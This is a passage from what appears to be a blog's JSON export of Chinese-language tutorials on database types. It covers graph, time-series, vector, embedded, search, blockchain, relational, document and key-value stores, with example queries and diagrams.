&#123;name: &quot;hiking&quot;&#125;) AND NOT (me)-[:FRIENDS_WITH]-&gt;(fof) RETURN fof.name, COUNT(friend) as mutual_friends ORDER BY mutual_friends DESC LIMIT 10 此查询有效地遍历关系以寻找朋友推荐。在关系型数据库中，这需要多次自连接，速度会慢得多。 graph TB A([👤 Alice]) -->|FRIENDS_WITH| B([👤 Bob]) A -->|FRIENDS_WITH| C([👤 Carol]) B -->|FRIENDS_WITH| D([👤 David]) C -->|FRIENDS_WITH| D D -->|LIKES| E([🏔️ 徒步]) B -->|LIKES| F([📚 阅读]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 时间序列数据库：针对时间数据优化 时间序列数据库专门用于随时间变化的数据：指标、事件、传感器读数。它们针对高效地摄取、存储和查询带时间戳的数据进行优化。 运作方式 数据按时间戳组织，并针对基于时间的查询和聚合进行优化。时间序列数据库通常使用特定于时间数据的压缩技术，实现比通用数据库好 10-100 倍的压缩。它们通常包含用于降采样、插值和时间窗口聚合的内置函数。 优势 摄取性能：针对带时间戳数据的大量写入进行优化，每秒处理数百万个数据点。 存储效率：专门的压缩算法大幅减少时间序列数据的存储需求。 基于时间的查询：用于时间窗口、聚合和时间分析的内置函数使复杂查询变得简单。 保留策略：自动数据生命周期管理，根据年龄降采样旧数据或删除它。 劣势 有限的使用案例：仅适用于时间序列数据；不是通用数据库。 更新复杂性：针对仅附加工作负载进行优化；更新历史数据可能效率低下。 查询限制：不是为不同数据类型之间的复杂连接或关系而设计的。 最佳使用案例 应用程序监控：性能指标、错误率、资源利用率 IoT 传感器数据：温度、压力、位置跟踪 金融数据：股票价格、交易量、市场数据 DevOps：基础设施监控、日志聚合 工业系统：制造指标、设备遥测 热门示例 InfluxDB：专为时间序列打造、类 SQL 查询语言 TimescaleDB：PostgreSQL 扩展、结合关系型和时间序列功能 Prometheus：专注于监控、基于拉取的指标收集 Amazon Timestream：完全托管、无服务器时间序列数据库 🎬 真实世界情境IoT 平台使用 InfluxDB 存储传感器数据： Measurement: temperature Tags: sensor_id&#x3D;sensor1, location&#x3D;warehouse_a Fields: value&#x3D;22.5 Timestamp: 2023-07-15T14:30:00Z 查询：「过去 7 天每小时的平均温度」 SELECT MEAN(value) FROM temperature WHERE location&#x3D;&#39;warehouse_a&#39; AND time &gt; now() - 7d GROUP BY time(1h) 数据库有效地聚合数百万个数据点，在毫秒内返回结果。 向量数据库：AI 的相似性搜索 向量数据库是专门设计用于存储和查询高维向量的系统 - 文本、图像或音频等数据的数值表示。它们已成为 AI 应用程序的必备工具，特别是那些使用机器学习嵌入的应用程序。 运作方式 向量数据库不存储传统数据类型，而是存储表示数据语义意义的向量（数字数组）。当您搜索时，数据库使用余弦相似度或欧几里得距离等数学距离度量来寻找「接近」您查询向量的向量。这实现了语义搜索 - 根据意义而非精确匹配来寻找相似项目。 示例：句子「狗在公园玩耍」可能表示为 1536 维向量，如 [0.23, -0.45, 0.67, …]。类似的句子如「小狗在户外奔跑」在数学空间中会有接近的向量。 优势 语义搜索：根据意义而非关键字寻找相似项目。搜索「快乐的狗」并找到「快乐的小狗」，即使它们没有共同的词。 AI 集成：原生支持来自 OpenAI、BERT 或自定义神经网络等模型的机器学习嵌入。 快速相似性搜索：优化的算法（ANN - 近似最近邻）在毫秒内找到相似向量，即使有数十亿个向量。 多模态支持：在同一向量空间中存储和搜索不同的数据类型 - 文本、图像、音频。 劣势 专业化使用案例：仅在需要相似性搜索时有用；对于传统查询来说过度。 嵌入依赖性：需要外部模型来生成向量；质量取决于嵌入模型。 存储需求：高维向量消耗大量存储空间，特别是在大规模时。 近似结果：大多数使用近似算法以提高速度，牺牲完美准确性以换取性能。 最佳使用案例 语义搜索：文档搜索、知识库、问答系统 推荐引擎：相似产品、内容推荐 图像搜索：寻找相似图像、反向图像搜索 聊天机器人和 RAG：AI 助手的检索增强生成 异常检测：在高维数据中寻找异常值 重复检测：寻找相似或重复的内容 热门示例 Pinecone：完全托管、针对生产 AI 应用程序优化 Weaviate：开源、内置向量化、GraphQL API Milvus：开源、高性能、支持多种索引 Qdrant：基于 Rust、过滤功能、有效负载存储 pgvector：PostgreSQL 扩展、结合关系型和向量搜索 🎬 真实世界情境客户支持聊天机器人使用 Pinecone 进行知识检索： 索引：使用 OpenAI 嵌入将 10,000 篇支持文章转换为向量 用户查询：「如何重置密码？」 向量搜索：将查询转换为向量，找到 5 个最相似的文章向量 响应：AI 使用检索到的文章作为上下文生成答案 系统即使用户以不同方式表达问题也能找到相关文章： 「忘记密码」→ 找到密码重置文章 「无法登录」→ 找到身份验证故障排除 「账户锁定」→ 找到账户恢复程序 传统关键字搜索会错过这些语义连接。 graph TB A([📝 用户查询「如何重置密码？」]) --> B([🔢 转换为向量[0.23, -0.45, ...]]) B --> C([🔍 向量数据库寻找相似向量]) D([📚 知识库文章作为向量]) --> C C --> E([📄 前 5 个相似文章检索]) E --> F([🤖 AI 生成上下文答案]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 嵌入式数据库：轻量且自包含 嵌入式数据库是在应用程序内运行的轻量级数据库引擎，而不是作为独立的服务器进程。它们非常适合移动应用程序、桌面应用程序和边缘设备，其中简单性和最小资源使用是优先考虑的。 运作方式 与客户端-服务器数据库不同，嵌入式数据库在与您的应用程序相同的进程中运行。整个数据库通常是存储在设备本地的单个文件。没有网络通信、没有独立的数据库服务器、没有复杂的设置 - 只需包含库并开始存储数据。 优势 零配置：不需要服务器安装或设置。只需在应用程序中包含库并开始使用。 轻量级：最小的内存占用和磁盘空间需求，非常适合资源受限的设备。 离线优先：无需网络连接即可工作，非常适合需要离线功能的移动应用程序。 快速性能：没有网络延迟，因为数据库在进程内运行。查询在微秒内执行。 可移植性：数据库文件可以轻松复制、备份或在设备之间传输。 劣势 单一应用程序访问：一次只有一个应用程序可以访问数据库（尽管有些支持只读并发访问）。 有限的可扩展性：不是为高并发或大规模部署而设计的。 没有远程访问：没有额外的基础设施，无法从另一台机器查询数据库。 功能限制：与完整的数据库服务器相比功能较少（没有存储过程、有限的用户管理）。 最佳使用案例 移动应用程序：iOS 和 Android 应用程序在本地存储用户数据 桌面应用程序：配置、缓存和用户数据存储 IoT 和边缘设备：在资源受限的硬件上收集传感器数据 浏览器应用程序：网络应用程序中的客户端数据存储 测试和开发：无需数据库服务器设置即可快速原型制作 嵌入式系统：汽车、医疗设备、工业设备 热门示例 SQLite：部署最广泛的数据库，用于数十亿台设备（iOS、Android、浏览器） Microsoft Access：具有 GUI 的桌面数据库，适合小型企业应用程序和原型制作 Realm：移动优先数据库，具有实时同步，适合 iOS 和 Android LevelDB：嵌入在 Chrome 和许多应用程序中的键值存储 Berkeley DB：用于 C/C++ 应用程序的高性能嵌入式数据库 EdgeDB（IoT）：轻量级，专为边缘计算和资源有限的 IoT 设备设计 RocksDB：针对快速存储优化的嵌入式键值存储，用于 IoT 网关 📊 Microsoft Access：桌面数据库Microsoft Access 介于嵌入式和客户端-服务器数据库之间： 优势： 无需代码即可创建表格、表单和报告的可视化界面 与 Microsoft Office 生态系统集成 适合小型团队（&lt; 10 个并发用户） 快速原型制作和小型企业应用程序 限制： 仅限 Windows，需要 Microsoft Office 许可 可扩展性差 - 2GB 文件大小限制，多用户时性能下降 不适合网络应用程序或移动应用程序 有限的安全性和备份功能 **何时使用：**小型企业数据库、部门应用程序、稍后将迁移到适当数据库的快速原型。对于严肃的应用程序，请改用 PostgreSQL 或 MySQL。 🎬 真实世界情境移动健身应用程序使用 SQLite 存储锻炼数据： -- 应用程序首次启动时创建表格 CREATE TABLE workouts ( id INTEGER PRIMARY KEY, date TEXT, type TEXT, duration INTEGER, calories INTEGER ); -- 在本地存储锻炼数据 INSERT INTO workouts VALUES (1, &#39;2023-07-15&#39;, &#39;Running&#39;, 30, 250); -- 查询锻炼历史 SELECT * FROM workouts WHERE date &gt;&#x3D; date(&#39;now&#39;, &#39;-7 days&#39;) ORDER BY date DESC; **好处：** - 离线工作 - 用户可以在没有互联网的情况下记录锻炼 - 快速 - 查询在设备上立即执行 - 私密 - 数据保留在用户的设备上 - 简单 - 基本功能不需要后端服务器 - 稍后同步 - 可在连接可用时上传到云 graph TB A([📱 移动应用程序]) --> B([SQLite 数据库本地文件]) B --> C([离线访问不需要网络]) C --> D({互联网可用？}) D -->|是| E([☁️ 同步到云可选]) D -->|否| F([✅ 继续工作离线]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px 💡 SQLite：世界上部署最广泛的数据库SQLite 可能是世界上使用最广泛的数据库： 每台 Android 设备都内置 SQLite 每台 iOS 设备都使用 SQLite 存储系统数据 所有主要网络浏览器都使用 SQLite 估计有 1+ 万亿个 SQLite 数据库在使用中 公有领域 - 完全免费，无需许可 单个 C 文件 - 整个数据库引擎约 150KB 如果您今天使用过智能手机，您就使用过 SQLite。 搜索引擎：全文搜索与分析 像 Elasticsearch 这样的搜索引擎是专门针对全文搜索、日志分析和实时分析优化的数据库。虽然不是传统数据库，但它们是现代数据架构的重要组成部分。 运作方式 数据使用倒排索引进行索引，将词映射到包含它们的文档。这使得文本搜索非常快。搜索引擎还支持具有相关性评分、模糊匹配和分面搜索的复杂查询。 优势 全文搜索：在大型文本数据集中进行快速、相关的搜索，具有词干提取、同义词和拼写错误容忍等功能。 实时分析：以亚秒级响应时间实时聚合和分析数据。 可扩展性：分布式架构处理跨集群的 PB 级数据。 灵活性：具有动态映射的无模式 JSON 文档。 劣势 不符合 ACID：最终一致性模型；不适合事务数据。 资源密集：索引和查询需要大量内存和 CPU。 复杂性：集群管理、调整和优化需要专业知识。 最佳使用案例 网站搜索：电子商务产品搜索、内容搜索 日志分析：应用程序日志、安全日志、审计轨迹 商业分析：实时仪表板、指标可视化 推荐系统：基于用户行为的内容发现 热门示例 Elasticsearch：最受欢迎、丰富的生态系统、强大的分析 Apache Solr：成熟、功能丰富、适合企业搜索 Amazon OpenSearch：托管的 Elasticsearch 兼容服务 选择正确的数据库：决策框架 有这么多数据库类型，您如何选择？这里有一个实用的框架： 步骤 1：了解您的数据 结构：您的数据是高度结构化的（关系型）、半结构化的（文档）还是非结构化的（键值）？ 关系：数据之间的关系重要吗？它们有多复杂？ 模式稳定性：您的数据结构会经常变化，还是稳定的？ 步骤 2：分析您的访问模式 读取与写入：您的工作负载是读取密集型、写入密集型还是平衡的？ 查询复杂性：您需要具有连接和聚合的复杂查询，还是简单的查找？ 实时需求：您需要即时一致性，还是最终一致性可以接受？ 步骤 3：考虑规模和性能 数据量：您将存储多少数据？GB、TB、PB？ 流量：每秒多少请求？是否有流量高峰？ 延迟需求：您需要什么响应时间？毫秒还是秒？ 步骤 4：评估运营需求 团队专业知识：您的团队了解哪些数据库？ 运营复杂性：您能管理分布式系统，还是需要托管服务？ 成本：您的许可、基础设施和运营预算是多少？ 步骤 5：思考未来 成长：您的数据和流量将如何成长？ 演进：您的需求可能如何变化？ 供应商锁定：如果需要，迁移有多容易？ 🎯 快速决策指南 具有复杂关系的结构化数据 → 关系型（PostgreSQL、MySQL） 灵活模式、面向文档 → 文档（MongoDB、Couchbase） 简单、快速查找 → 键值（Redis、DynamoDB） 大型数据集上的分析 → 列族（Cassandra、Redshift） 连接数据、关系查询 → 图形（Neo4j、Neptune） 带时间戳的指标和事件 → 时间序列（InfluxDB、TimescaleDB） 语义相似性搜索、AI 应用程序 → 向量（Pinecone、Weaviate） 移动应用程序、离线优先、嵌入式系统 → 嵌入式（SQLite、Realm） 全文搜索 → 搜索引擎（Elasticsearch、Solr） 多语言持久化：使用多个数据库 现代应用程序通常使用多种数据库类型，每种都处理最适合它的工作负载。这种方法称为多语言持久化，可最大化性能和效率。 示例架构 电子商务平台可能使用： PostgreSQL：订单处理、库存、客户账户（ACID 事务） MongoDB：产品目录（产品属性各异的灵活模式） Redis：会话管理、购物车（快速访问、临时数据） Elasticsearch：产品搜索（具有相关性排名的全文搜索） Neo4j：产品推荐（基于关系的建议） InfluxDB：应用程序指标（时间序列监控数据） graph TB A([🛒 电子商务应用程序]) --> B([PostgreSQL订单与库存]) A --> C([MongoDB产品目录]) A --> D([Redis会话与缓存]) A --> E([Elasticsearch产品搜索]) A --> F([Neo4j推荐]) A --> G([InfluxDB指标]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#ffebee,stroke:#c62828,stroke-width:2px style E fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px style G fill:#fce4ec,stroke:#c2185b,stroke-width:2px 好处 优化性能：每个数据库处理它最擅长的事情，最大化整体系统性能。 灵活性：为每项工作选择正确的工具，而不是将所有内容强制放入一个数据库。 可扩展性：根据特定需求独立扩展系统的不同部分。 挑战 复杂性：管理多个数据库增加了运营开销。 数据一致性：在数据库之间保持数据同步需要仔细设计。 学习曲线：团队需要多种数据库技术的专业知识。 成本：更多数据库意味着更多基础设施和许可成本。 ⚠️ 何时避免多语言持久化不要仅仅因为可以就使用多个数据库。从简单开始： 小型应用程序：一个数据库通常就足够了 有限的团队：坚持您的团队熟悉的 紧张的预算：多个数据库增加成本 简单的需求：不要过度工程化 只有在您有明确的性能或功能需求而当前数据库无法满足时，才添加数据库。 区块链：作为数据库的分布式账本 区块链可以被视为一种专业化的数据库类型，但具有使其与传统数据库根本不同的独特特征。它是一个专为无需信任、防篡改记录保存而设计的分布式账本。 运作方式 区块链将数据存储在以密码学方式连接在一起的区块中。每个区块包含交易、时间戳和前一个区块的哈希值。数据库在网络中的多个节点上复制，共识机制确保所有节点在没有中央权威的情况下就当前状态达成一致。 优势 不可变性：一旦数据写入区块链，就无法更改或删除。这创造了所有交易的可审计历史。 去中心化：没有单一的控制点或故障点。数据库分布在许多节点上，使其高度弹性。 透明性：所有参与者都可以验证交易和数据完整性。整个历史是可见和可审计的。 无需权威的信任：密码学证明和共识机制使各方能够在不信任中央权威的情况下进行交易。 劣势 极其缓慢：共识机制使写入比传统数据库慢几个数量级。比特币每秒处理约 7 笔交易，而传统数据库可处理数千笔。 存储效率低：每个节点都存储整个区块链，导致大量存储冗余。比特币的区块链超过 500GB。 没有更新或删除：仅附加结构意味着您无法修改或移除数据，只能添加记录。 高能源成本：工作量证明共识（如比特币）消耗大量电力。 有限的查询功能：没有复杂的查询、连接或聚合。主要是按交易 ID 或区块编号进行键值查找。 最佳使用案例 加密货币：比特币、以太坊和其他数字货币 供应链跟踪：产品来源的不可变记录 智能合约：区块链平台上的自执行协议 数字身份：去中心化身份验证 审计轨迹：合规和监管要求的防篡改日志 热门示例 Bitcoin：第一个区块链、加密货币交易 Ethereum：智能合约平台、可编程区块链 Hyperledger Fabric：私有网络的企业区块链 Corda：金融服务的区块链 ⚠️ 区块链与传统数据库使用区块链的时机： 多方需要在不互相信任的情况下共享数据 不可变性和审计轨迹至关重要 去中心化比性能更重要 使用传统数据库的时机： 您需要快速读写（几乎总是） 您需要更新或删除数据 您需要复杂的查询和分析 单一组织控制数据 性能和成本很重要 现实检查：99% 的应用程序不需要区块链。传统数据库更快、更便宜、更灵活。只有在去中心化和不可变性是绝对要求时才使用区块链。 graph LR A([📝 新交易]) --> B([创建区块]) B --> C([广播到网络]) C --> D([节点验证]) D --> E({达成共识？}) E -->|是| F([区块添加到链]) E -->|否| G([交易被拒绝]) F --> H([不可变记录]) style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 新兴趋势与未来方向 数据库领域持续演进。以下是塑造未来的趋势： 多模型数据库 在一个系统中支持多种数据模型（文档、图形、键值）的数据库，减少对多语言持久化的需求。示例：ArangoDB、CosmosDB。 无服务器数据库 按使用付费的数据库，在不使用时自动缩放到零，消除基础设施管理。示例：Amazon Aurora Serverless、Azure Cosmos DB。 云原生数据库 专为云环境设计的数据库，具有内置的分布、复制和跨多个区域的扩展。与为云改编的传统数据库不同，这些是从头开始为分布式云基础设施构建的。 关键功能： 自动扩展和自我修复 具有强一致性的多区域复制 按使用付费定价模型 Kubernetes 原生部署 内置高可用性和灾难恢复 示例： Google Spanner：全球分布式、水平可扩展、强一致性 CockroachDB：PostgreSQL 兼容、可承受数据中心故障、开源 YugabyteDB：多云、PostgreSQL 兼容、分布式 SQL Amazon Aurora：MySQL/PostgreSQL 兼容、5 倍性能提升 Azure Cosmos DB：多模型、全球分布式、99.999% 可用性 SLA NewSQL 数据库 结合 NoSQL 的可扩展性与关系型数据库的 ACID 保证。示例：Google Spanner、CockroachDB、VoltDB。 AI 优化数据库 具有内置机器学习功能的数据库，用于自动调整、查询优化和异常检测。 结论：为工作选择正确的工具 数据库类型的爆炸性增长不是要取代关系型数据库 - 而是要扩展我们的工具箱。每种数据库类型都比通用解决方案更好地解决特定问题。理解这些差异使您能够做出明智的决策，提高性能、降低成本并简化开发。 关键不是记住每个数据库功能 - 而是理解基本权衡：一致性与可用性、灵活性与结构、简单性与功能。有了这些知识，您可以评估新出现的数据库并为每项工作选择正确的工具。 从简单开始。使用您知道的。但当您遇到限制 - 查询缓慢、扩展挑战或尴尬的数据建模 - 请记住，专业化数据库的存在就是为了解决这些确切的问题。数据库领域丰富多样是有原因的：不同的问题需要不同的解决方案。 💭 最后的想法「没有一体适用的数据库。最好的数据库是适合您特定使用案例、团队专业知识和运营能力的数据库。」 明智地选择，但不要过度思考。随着需求的增长，您总是可以演进您的架构。 额外资源 学习资源： Database Fundamentals - 数据库概念的综合课程 SQL Tutorial - 交互式 SQL 学习 NoSQL Distilled - Martin Fowler 关于 NoSQL 数据库的书 数据库文档： PostgreSQL Documentation MongoDB Manual Redis Documentation Neo4j Documentation 比较工具： DB-Engines Ranking - 数据库受欢迎程度和趋势 Database of Databases - 综合数据库目录","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"},{"name":"SQL","slug":"SQL","permalink":"https://neo01.com/tags/SQL/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://neo01.com/tags/NoSQL/"},{"name":"Data Storage","slug":"Data-Storage","permalink":"https://neo01.com/tags/Data-Storage/"}],"lang":"zh-CN"},{"title":"理解資料庫類型：完整指南","slug":"2023/07/Understanding_Database_Types_A_Comprehensive_Guide-zh-TW","date":"un44fin44","updated":"un55fin55","comments":true,"path":"/zh-TW/2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","permalink":"https://neo01.com/zh-TW/2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","excerpt":"從關聯式到圖形資料庫 - 探索多樣化的資料儲存系統世界，學習哪種資料庫類型適合您的應用程式需求。","text":"還記得您第一次需要為應用程式儲存資料嗎？您可能隨手選了一個聽過的資料庫 - 也許是 MySQL 或 PostgreSQL - 沒有多想它是否是正確的選擇。它能用，所以您就繼續了。但隨著應用程式成長，您可能遇到了瓶頸：查詢緩慢、擴展挑戰，或資料結構就是無法適配關聯式模型。 事實是：資料庫並非一體適用。過去二十年來，資料庫領域已經爆炸性成長，從關聯式資料庫的主導地位演變為豐富的專業化儲存系統生態系統。每種類型都針對特定使用案例、資料模式和效能需求進行最佳化。 選擇錯誤的資料庫就像在需要螺絲起子時使用錘子 - 可能有用，但您會不必要地掙扎。理解不同類型的資料庫及其優勢，有助於您做出明智的決策，節省時間、金錢和麻煩。 💡 什麼是資料庫？資料庫是結構化資訊或資料的有組織集合，通常以電子方式儲存在電腦系統中。資料庫管理系統（DBMS）控制資料庫，允許使用者有效且安全地建立、讀取、更新和刪除資料。 資料庫演進：從檔案到專業化系統 在深入探討特定資料庫類型之前，讓我們先了解我們是如何走到這一步的。在計算的早期，應用程式將資料儲存在平面檔案中 - 簡單的文字檔案，記錄由分隔符號分隔。這對小型資料集有效，但隨著資料增長很快就變得難以管理。 1970 年代的關聯式資料庫革命改變了一切。Edgar F. Codd 的關聯式模型引入了具有關聯性的結構化表格，透過 SQL（結構化查詢語言）實現複雜查詢。數十年來，Oracle、MySQL 和 PostgreSQL 等關聯式資料庫主導了這個領域，這是有充分理由的 - 它們提供了一致性、可靠性和強大的查詢能力。 但網際網路時代帶來了新挑戰。網路應用程式需要處理大規模、不可預測的流量高峰，以及無法整齊地放入表格的多樣化資料類型。這引發了 2000 年代的 NoSQL 運動，引入了針對特定使用案例最佳化的資料庫：用於靈活架構的文件儲存、用於速度的鍵值儲存、用於分析的列儲存，以及用於連接資料的圖形資料庫。 今天，我們生活在一個多語言持久化的世界，應用程式使用多種資料庫類型，每種都處理最適合它的工作負載。您的電子商務網站可能使用關聯式資料庫處理交易、文件儲存處理產品目錄、快取處理會話資料，以及圖形資料庫處理推薦。 timeline title 資料庫系統的演進 1970s : 關聯式資料庫 : SQL 和 ACID 交易 : Oracle, IBM DB2 1980s-1990s : 成熟與主導 : MySQL, PostgreSQL : 企業採用 2000s : NoSQL 運動 : 網路規模挑戰 : MongoDB, Cassandra, Redis 2010s : 專業化系統 : 圖形、時間序列、NewSQL : 多語言持久化 2020s : 雲原生與分散式 : 無伺服器資料庫 : 多模型系統 關聯式資料庫（RDBMS）：基礎 關聯式資料庫將資料組織成表格（關聯），包含行和列。每個表格都有定義的架構，指定列名稱和資料類型。表格可以透過外鍵連結，在資料之間建立關聯性。 運作方式 資料儲存在具有嚴格架構的表格中。當您查詢資料時，資料庫引擎使用 SQL 來連接表格、過濾行和聚合結果。關聯式資料庫強制執行 ACID 屬性（原子性、一致性、隔離性、持久性）以確保資料完整性，使其成為正確性至關重要的應用程式的理想選擇。 ACID 屬性說明： 原子性：交易是全有或全無；如果一部分失敗，整個交易回滾 一致性：資料必須符合所有驗證規則和約束 隔離性：並發交易不會互相干擾 持久性：一旦提交，資料即使系統崩潰也會持久存在 優勢 資料完整性：外鍵、約束和交易確保資料保持一致和有效。您無法意外建立孤立記錄或違反業務規則。 複雜查詢：SQL 提供強大的功能來連接多個表格、聚合資料和執行複雜的分析查詢。需要找到上個月購買產品 X 但沒有購買產品 Y 的所有客戶？SQL 可以優雅地處理這個問題。 成熟的生態系統：數十年的開發產生了強大的備份、複製、監控和最佳化工具。知識庫廣泛，熟練的開發人員眾多。 標準化：SQL 在資料庫之間是標準化的，使得切換供應商或使用具有類似查詢語言的多個系統變得更容易。 劣勢 僵化的架構：在生產環境中更改表格結構可能複雜且有風險，特別是對於大型資料集。新增列可能需要停機或冗長的遷移。 擴展挑戰：水平擴展（增加更多伺服器）很困難，因為在分散式系統中維護 ACID 屬性很複雜。大多數關聯式資料庫垂直擴展（更大的伺服器），這有限制。 效能開銷：ACID 保證和複雜的查詢最佳化增加了開銷。對於簡單的鍵值查找，關聯式資料庫是過度的。 最佳使用案例 金融系統：銀行、會計、支付處理，資料完整性至關重要 電子商務交易：訂單處理、庫存管理、客戶帳戶 企業應用程式：ERP、CRM 系統，實體之間具有複雜關聯性 內容管理：具有結構化內容和關聯性的系統 熱門範例 PostgreSQL：開源、功能豐富、適合複雜查詢和 JSON 支援 MySQL：廣泛使用、易於設定、適合網路應用程式 Oracle Database：企業級、強大功能、高成本 Microsoft SQL Server：Windows 生態系統整合、強大的商業智慧工具 IBM DB2：企業資料庫、在大型主機上表現強勁、適合大規模交易系統 🎬 真實世界情境線上書店使用 PostgreSQL 進行核心營運： Customers 表格：使用者帳戶、地址、付款方式 Books 表格：ISBN、標題、作者、價格、庫存 Orders 表格：訂單詳情、狀態、時間戳記 Order_items 表格：將訂單連結到書籍及數量 當客戶下訂單時，交易確保： 庫存減少 建立訂單記錄 處理付款 如果任何步驟失敗，一切都會回滾 - 沒有部分訂單或庫存差異。 graph TB A([👤 客戶]) --> B([📦 訂單]) C([📚 書籍]) --> D([📋 訂單項目]) B --> D D --> C style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 文件資料庫：靈活且無架構 文件資料庫將資料儲存為文件，通常採用 JSON 或 BSON 格式。與具有僵化架構的關聯式資料庫不同，文件資料庫允許每個文件具有不同的欄位，為不斷演變的資料結構提供靈活性。 運作方式 每個文件都是一個自包含的單元，包含所有相關資料。文件資料庫不是將客戶資訊分散在多個表格中，而是將所有內容儲存在一個文件中：客戶詳情、地址、訂單歷史和偏好。文件組織成集合（類似於表格），可以使用文件特定的查詢語言進行查詢。 優勢 架構靈活性：無需遷移即可新增欄位。同一集合中的不同文件可以具有不同的結構，非常適合不斷演變的應用程式。 自然的資料建模：文件自然地映射到程式語言中的物件。您的應用程式資料結構可以直接儲存，無需複雜的物件關聯映射。 效能：檢索文件可在一次操作中獲取所有相關資料，避免昂貴的連接。這使得讀取操作快速。 水平擴展：大多數文件資料庫專為分散式系統設計，使得跨多個伺服器擴展更容易。 劣勢 資料重複：非正規化資料意味著相同的資訊可能儲存在多個文件中，增加儲存需求和更新複雜性。 有限的交易：雖然現代文件資料庫支援交易，但與關聯式資料庫相比通常受到限制，特別是跨多個文件或集合。 查詢複雜性：涉及多個集合的複雜查詢可能具有挑戰性，效率不如 SQL 連接。 一致性權衡：許多文件資料庫優先考慮可用性和分區容錯性，而不是即時一致性（最終一致性模型）。 最佳使用案例 內容管理：部落格、新聞網站，內容結構各異 使用者設定檔：社交網路、遊戲平台，具有多樣化的使用者資料 產品目錄：電子商務，產品屬性各異 即時分析：事件記錄、使用者行為追蹤 行動應用程式：離線優先的應用程式，與雲端資料庫同步 熱門範例 MongoDB：最受歡迎的文件資料庫、豐富的查詢語言、良好的工具 Couchbase：高效能、內建快取、行動同步功能 Amazon DocumentDB：MongoDB 相容、完全託管的 AWS 服務 Firebase Firestore：即時同步、適合行動和網路應用程式 🎬 真實世界情境部落格平台使用 MongoDB 儲存文章： { &quot;_id&quot;: &quot;article123&quot;, &quot;title&quot;: &quot;理解資料庫&quot;, &quot;author&quot;: &#123; &quot;name&quot;: &quot;Jane Doe&quot;, &quot;email&quot;: &quot;jane@example.com&quot; &#125;, &quot;content&quot;: &quot;...&quot;, &quot;tags&quot;: [&quot;資料庫&quot;, &quot;教學&quot;], &quot;comments&quot;: [ &#123; &quot;user&quot;: &quot;John&quot;, &quot;text&quot;: &quot;很棒的文章！&quot;, &quot;timestamp&quot;: &quot;2023-07-15T10:30:00Z&quot; &#125; ], &quot;published&quot;: true, &quot;views&quot;: 1523 &#125; 與文章相關的所有內容 - 作者資訊、評論、標籤 - 都在一個文件中。檢索文章只需要一次查詢，不需要多次連接。 鍵值儲存：速度與簡單性 鍵值儲存是最簡單的資料庫類型，將資料儲存為鍵值對的集合。可以將其視為一個巨大的雜湊映射或字典，您使用唯一鍵儲存值並立即檢索它們。 運作方式 資料僅透過鍵存取。您提供一個鍵，資料庫返回相關的值。沒有查詢語言、沒有連接、沒有複雜操作 - 只有快速查找。值可以是任何東西：字串、數字、JSON 物件或二進位資料。 優勢 極致效能：鍵值查找非常快，通常在亞毫秒級。這使它們成為快取和高吞吐量應用程式的理想選擇。 水平擴展：簡單的資料模型使得使用一致性雜湊或類似技術在多個伺服器之間分配資料變得容易。 簡單性：最小的複雜性意味著出錯的可能性更少。易於理解、部署和維護。 靈活性：值可以是任何資料類型，資料庫不關心它們的結構。 劣勢 有限的查詢：您只能透過鍵檢索資料。沒有搜尋、過濾或聚合，除非建立自訂索引。 沒有關聯性：沒有內建的資料關聯性支援。您必須在應用程式程式碼中管理關聯性。 資料建模挑戰：設計有效的鍵結構需要仔細規劃。糟糕的鍵設計導致低效的存取模式。 最佳使用案例 快取：會話資料、API 回應、計算結果 會話管理：網路應用程式使用者會話 即時資料：排行榜、計數器、速率限制 購物車：不需要複雜查詢的臨時資料 配置儲存：應用程式設定、功能標誌 熱門範例 Redis：記憶體內儲存、豐富的資料結構（列表、集合、有序集合）、發布/訂閱訊息 Amazon DynamoDB：完全託管、可預測的效能、自動擴展 Memcached：簡單、高效能快取 Riak：分散式、高可用性、適合大規模部署 🎬 真實世界情境電子商務網站使用 Redis 進行會話管理： Key: &quot;session:abc123&quot; Value: &#123; &quot;user_id&quot;: 456, &quot;cart&quot;: [&quot;item1&quot;, &quot;item2&quot;], &quot;last_activity&quot;: &quot;2023-07-15T14:30:00Z&quot; &#125; 當使用者發出請求時，應用程式： 1. 從 cookie 中提取會話 ID 2. 在 Redis 中查找會話資料（&lt; 1ms） 3. 使用會話上下文處理請求 4. 如需要則更新會話資料 這比每次請求都查詢關聯式資料庫快得多。 列族儲存：大規模分析 列族儲存（也稱為寬列儲存）將資料組織成列而不是行。雖然這聽起來類似於關聯式資料庫，但架構根本不同，並針對不同的使用案例進行最佳化。 運作方式 資料儲存在列族中 - 相關列的群組。與將整行儲存在一起的關聯式資料庫不同，列儲存將每列的資料保持在一起。這使得讀取跨多行的特定列非常有效率，非常適合聚合資料的分析查詢。 面向行與面向列的儲存： 面向行（RDBMS）：將一行的所有列儲存在一起。快速檢索完整記錄。 面向列：將一列的所有值儲存在一起。快速聚合跨多行的特定列。 優勢 分析效能：掃描數百萬行中特定列的查詢非常快，因為只從磁碟讀取相關列。 壓縮：將相似資料儲存在一起可實現更好的壓縮比，降低儲存成本並提高 I/O 效能。 